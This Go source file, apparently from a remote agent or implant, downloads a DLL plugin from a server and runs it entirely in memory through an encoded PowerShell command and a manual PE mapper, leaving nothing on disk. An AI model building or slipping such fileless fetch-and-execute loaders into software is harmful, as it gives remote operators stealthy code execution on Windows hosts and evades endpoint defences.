//go:build windows

package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net/http"
	"runtime"
	"strings"
	"time"
)

// loadPluginPEPowershellHost executes a plugin from a memory-hosted session
// while keeping the sacrificial child process the plugin model requires.
// Instead of re-executing this agent's image (inside a loader host that path
// names powershell.exe), a bounded Windows PowerShell child hosts the
// identical --plugin-child contract: the DLL bytes travel the standard
// length-prefixed stdin frame, the child maps them in memory with an
// Add-Type compiled C# mapper, and the export result returns over stdout.
// Nothing is written to disk — no agent image, no plugin file — exactly like
// the copy-of-self plugin child. A bad plugin crashes only the child, never
// the agent or its host. The child launches through the same
// runPluginCommand identity path as every other plugin child. Because the
// child maps manually, a plugin opting into the Windows loader
// (RMMRequiresWindowsLoader) cannot run here and fails with an explicit
// error directing to an on-disk session; long-lived channel plugins
// (socks/tun) keep the copy-of-self child and their in-memory guard.
func loadPluginPEPowershellHost(client *http.Client, cfg *config, url, exportName, input string) (string, error) {
	if runtime.GOARCH != "amd64" {
		return "", errors.New("PE plugins require the windows/amd64 agent build")
	}
	ctx, cancel := context.WithTimeout(agentContext, pluginRunTimeout)
	defer cancel()
	data, err := requestContext(ctx, client, cfg, http.MethodGet, url, values(cfg), nil)
	if err != nil {
		return "", fmt.Errorf("plugin download failed: %w", err)
	}
	if len(data) == 0 || len(data) > 512*1024*1024 || len(input) > 4096 || !pluginExportPattern.MatchString(exportName) {
		return "", errors.New("invalid plugin size, input size, or export name")
	}
	useWindowsLoader, err := pluginRequiresWindowsLoader(data)
	if err != nil {
		return "", err
	}
	if useWindowsLoader {
		return "", errors.New("this plugin opts into the Windows loader, which requires an on-disk agent session; run it from a copy-of-self child instead")
	}
	executable, err := windowsPowerShellExecutable()
	if err != nil {
		return "", err
	}
	script := pluginPowershellHostScript(exportName)
	cmd := newBoundedCommand(ctx, executable,
		"-NoLogo", "-NoProfile", "-NonInteractive", "-EncodedCommand", winrmEncodedCommand(script))
	cmd.Stdin = framePluginForChild(data, input)
	var stdout, stderr bytes.Buffer
	cmd.WaitDelay = 2 * time.Second
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := runPluginCommand(cmd); err != nil {
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return "", fmt.Errorf("plugin timed out after %s", pluginRunTimeout)
		}
		if ctx.Err() != nil {
			return "", ctx.Err()
		}
		message := strings.TrimSpace(stderr.String())
		if message == "" {
			message = err.Error()
		}
		return "", fmt.Errorf("plugin child failed: %s", message)
	}
	return strings.TrimRight(stdout.String(), "\x00\r\n"), nil
}
